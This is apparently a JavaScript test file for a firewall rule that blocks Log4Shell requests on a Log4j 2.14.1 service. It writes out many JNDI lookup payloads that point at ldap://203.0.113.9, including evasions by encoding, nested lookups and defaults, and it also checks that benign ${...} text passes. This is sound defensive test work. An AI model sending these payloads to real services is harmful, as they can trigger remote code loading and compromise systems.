/* fixtures/log4j-2.14.1-lookups.json holds strings logged by a service on
 * Log4j 2.14.1 and whether the logger then opened a connection. Every one
 * that fired must be reset. */
export const port = 8080;

export default function ({ f, run, stream, ok, progs, bytes, show, root, readFileSync, req, get, post, part, multipart, B, tomcatSpellings }) {
  const web = { dport: port };
  const truth = JSON.parse(readFileSync(new URL("test/fixtures/log4j-2.14.1-lookups.json", root), "utf8")).cases;
  const header = (v) => get("/", `X-Api-Version: ${v}\r\n`);
  let fired = 0;
  for (const c of truth) {
    if (!c.fired) continue;
    fired++;
    const v = Buffer.from(c.value, "base64").toString("latin1");
    const r = progs.get(f).exec(bytes(header(v)), { flow: {}, source: {}, bucket: {}, now: 0n, ...web });
    ok(r.verdict === "rst", `${f}: Log4j resolved "${c.label}"`, `got ${show(r)}`);
    /* the jndi rule alone is not enough: with defaults allowed, what is left must still be caught or be a pure :- form */
  }
  ok(fired >= 15, `${f}: the Log4j fixture holds the lookups that fired`, `only ${fired}`);
  const J = "${jndi:ldap://203.0.113.9/a}";
  run(f, "in the User-Agent", req("GET", "/", "").replace("Mozilla/5.0", J), "rst(log4shell)", web);
  run(f, "in the path", get("/?q=" + J), "rst(log4shell)", web);
  run(f, "in a JSON body", post("/api", "Content-Type: application/json\r\n", `{"user":"${J}"}`), "rst(log4shell)", web);
  run(f, "percent-encoded", get("/?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.9%2Fa%7D"), "rst(log4shell)", web);
  run(f, "half percent-encoded", get("/?q=$%7bjndi:ldap://203.0.113.9/a}"), "rst(log4shell)", web);
  run(f, "JSON \\u escapes", post("/api", "Content-Type: application/json\r\n", `{"user":"\\u0024\\u007Bjndi:ldap://203.0.113.9/a}"}`), "rst(log4shell)", web);
  run(f, "no literal jndi: anywhere", header("${jndi${::-:}ldap://203.0.113.9/a}"), "rst(log4shell)", web);
  run(f, "jndi built from lookups", header("${${lower:j}${upper:n}${lower:d}i:ldap://203.0.113.9/a}"), "rst(log4shell_lookup)", web);
  run(f, "jndi built from defaults", header("${${x:-j}${y:-n}di:ldap://203.0.113.9/a}"), "rst(log4shell_default)", web);
  run(f, "a default behind an encoded colon", get("/?q=%24%7B%24%7Bx%3A-j%7Dndi"), "rst(log4shell_default)", web);
  run(f, "lookup pieces still reset with defaults=1", header("${${lower:j}ndi:ldap://203.0.113.9/a}"), "rst(log4shell_lookup)", { ...web, knobs: { defaults: 1 } });
  run(f, "shell default, the documented cost", post("/job", "Content-Type: text/plain\r\n", "cd ${HOME:-/root}"), "rst(log4shell_default)", web);
  run(f, "shell default with defaults=1", post("/job", "Content-Type: text/plain\r\n", "cd ${HOME:-/root}"), "pass", { ...web, knobs: { defaults: 1 } });
  run(f, "template placeholders", post("/tpl", "Content-Type: text/plain\r\n", "Hello ${user.name}, total ${amount} at ${time}"), "pass", web);
  run(f, "JS template literal with a ternary", post("/src", "Content-Type: text/plain\r\n", "`${ok ? 'yes' : 'no'}`"), "pass", web);
  run(f, "a dollar amount and braces", post("/api", "Content-Type: application/json\r\n", `{"price":"$5","note":"{jndi} is a word"}`), "pass", web);
  run(f, "another port", header(J), "pass", { dport: 80 });
}

/* Sent through a firewall enforcing this policy with `pfw apply -f` (test/e2e.mjs). */
const J = "$" + "{jndi:ldap://203.0.113.9/a}";
const NESTED = "$" + "{$" + "{lower:j}ndi:ldap://203.0.113.9/a}";
export const e2e = ({ url }) => [
  { name: "a lookup in a header", curl: ["-H", `X-Api-Version: ${J}`, `${url}/`], want: "cut" },
  { name: "a nested lookup in the User-Agent", curl: ["-A", NESTED, `${url}/`], want: "cut" },
  { name: "a percent-encoded lookup in the query", curl: [`${url}/?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.9%2Fa%7D`], want: "cut" },
  { name: "an ordinary request", curl: ["-H", "X-Api-Version: 2", `${url}/?q=hello`], want: "served" },
];
